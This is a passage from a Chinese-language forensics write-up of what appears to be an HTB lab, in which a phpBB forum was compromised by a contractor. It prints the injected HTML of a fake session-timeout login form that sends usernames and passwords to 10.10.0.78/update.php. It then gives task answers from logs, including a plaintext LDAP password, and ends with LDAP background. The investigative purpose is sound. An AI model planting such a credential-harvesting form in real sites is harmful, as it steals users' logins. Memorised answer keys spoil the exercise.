class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Session Timeout<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Your session token has timed out in order to proceed you must login again.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.10.0.78/update.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">data-focus</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;panel&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;login-title&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fields1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;25&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox autowidth&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;25&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox autowidth&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;autologin&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autologin&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;autologin&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span>Remember me<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;viewonline&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewonline&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewonline&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>Hide my online status this session<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;6&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button1&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;sethidden()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br>&lt;/fieldset class=&quot;fields1&quot;&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-footer&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-footer&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;contentinfo&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-footer&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-footer linklist&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumbs&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;crumb&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">data-navbar-reference</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-home fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Board index<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;responsive-menu hidden rightside dropdown-container&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-bars fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer-inner&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-contents&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span>&gt;</span>All times are <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;UTC&quot;</span>&gt;</span>UTC<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=delete_cookies&quot;</span> <span class="hljs-attr">data-ajax</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">data-refresh</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-trash fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Delete cookies<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;copyright&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-row&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-copyright&quot;</span>&gt;</span>Powered by <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.phpbb.com/&quot;</span>&gt;</span>phpBB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>® Forum Software © phpBB Limited<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-row&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=privacy&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Privacy&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link-text&quot;</span>&gt;</span>Privacy<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=terms&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Terms&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link-text&quot;</span>&gt;</span>Terms<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;darkenwrapper&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;darkenwrapper&quot;</span> <span class="hljs-attr">data-ajax-error-title</span>=<span class="hljs-string">&quot;AJAX error&quot;</span> <span class="hljs-attr">data-ajax-error-text</span>=<span class="hljs-string">&quot;Something went wrong when processing ysqlite&gt;                                                                                                                                                                                                                                                     &gt;            &lt;div id=&quot;</span> <span class="hljs-attr">darken</span>&quot; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;darken&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span> <span class="hljs-attr">data-l-err</span>=<span class="hljs-string">&quot;Error&quot;</span> <span class="hljs-attr">data-l-timeout-processing-req</span>=<span class="hljs-string">&quot;Request timed out.&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_close&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-times-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_title&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;phpbb_confirm&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_close&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-times-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;anchor&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;z&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;cron&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Greetings everyone,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> I am just a visiting IT Contractor, it&#x27;s a fantastic company y&#x27;all have here.<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> I hope to work with you all again soon.<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> Regards,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Alex Poole<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>预览发现是一个登录页，代码审计一下会发现表单会把数据发送到 <code>http://10.10.0.78/update.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b2b9ac4d0d6002cc.png"></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">What is the <span class="hljs-literal">full</span> URI that the credential stealer sends its <span class="hljs-built_in">data</span> <span class="hljs-keyword">to</span>?<br>:http:<span class="hljs-comment">//10.10.0.78/update.php</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>查看 <code>phpbb_log</code> 找到登录时间 <code>log_time</code> ，但是日志中显示的时间是 Unix 时间（不懂这个），即纪元格式，因此还需要将时间转换为 UTC，<a href="https://conscioushacker.io/tools/zh-hans/unix-timestamp-to-date">Unix Timestamp to Date</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/070df67570c05911.png"></p><p>即 <code>Wed, 26 Apr 2023 10:53:12 GMT</code>，转换格式 <code>26/04/2023 10:53:12</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">When did the contractor log into the forum as the administrator? (UTC)<br><span class="hljs-meta">:26/04/2023 10:53:12</span> <br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>查找官方文档</p><p><a href="https://www.phpbb.com/support/docs/en/3.3/ug/adminguide/general_client/"><strong>LDAP Authentication</strong></a></p><p><img src="https://img.dkdun.cn/v1/2025/12/965831fc2b6cb3fb.png"></p><p>“This password will be stored as plain text in the database; it will be visible to everybody who can access your database”，说明数据库中有信息，查看 <code>phpbb_config</code> 配置数据，找到了 <code>ldap_password</code>，Passw0rd1</p><p><img src="https://img.dkdun.cn/v1/2025/12/6db2f634b86b1f19.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> forum there are plaintext credentials <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> LDAP connection, what is <span class="hljs-keyword">the</span> password?<br>:Passw0rd1<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>从前面已经知道 <code>10.255.254.2</code> 是管理员 IP，所以查看对应 IP 就能找到了</p><p><img src="https://img.dkdun.cn/v1/2025/12/240837947d082da3.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">user</span> agent <span class="hljs-keyword">of</span> the Administrator <span class="hljs-keyword">user</span>?<br>:Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>_15_7) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, <span class="hljs-keyword">like</span> Gecko) Chrome/<span class="hljs-number">112.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>查看 <code>phpbb_log</code> 能发现有 <code>LOG_USERS_ADDED</code> ，时间转化后为：<code>26/04/2023 10:53:51</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/28bfb628f2115b6f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> contractor <span class="hljs-built_in">add</span> themselves <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> Administrator group? (UTC)<br>:<span class="hljs-number">26</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2023</span> <span class="hljs-number">10</span>:<span class="hljs-number">53</span>:<span class="hljs-number">51</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>可以看到 IP <code>10.10.0.78</code> 在 <code>26/04/2023 12:01:38</code> 进行了一个 <code>/store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz</code>行为，下载了数据库，因为是 UTC 时间，所以减去 1 小时就正确了</p><p><img src="https://img.dkdun.cn/v1/2025/12/84fc98234eaaf064.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> contractor download <span class="hljs-keyword">the</span> database backup? (UTC)<br>:<span class="hljs-number">26</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2023</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span>:<span class="hljs-number">38</span><br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><p>直接找到对应时间查看大小</p><p><img src="https://img.dkdun.cn/v1/2025/12/49e7036594ce2199.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What was <span class="hljs-keyword">the</span> size <span class="hljs-keyword">in</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> database backup <span class="hljs-keyword">as</span> stated <span class="hljs-keyword">by</span> access.<span class="hljs-built_in">log</span>?<br>:<span class="hljs-number">34707</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>大致了解了一下</p><p>LDAP（Lightweight Directory Access Protocol），是一个轻量级目录访问<strong>协议</strong>，是一种运行于 TCP&#x2F;IP 之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的 LDAP 服务如微软的 ADAM(Active Directory Application Mode) 和 OpenLDAP， 重点是协议。LDAP相关的协议很多， X.500（原始目录访问协议），LDAP 是其更轻量级的版本。</p><p>更多详细的可以看： <a href="https://www.rfc-editor.org/rfc/pdfrfc/rfc4510.txt.pdf">LDAP 系列协议</a>，<a href="https://www.okta.com/identity-101/what-is-ldap/">What Is LDAP &amp; How Does It Work?</a>，<a href="https://ldap.com/basic-ldap-concepts/">Basic LDAP Concepts</a></p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
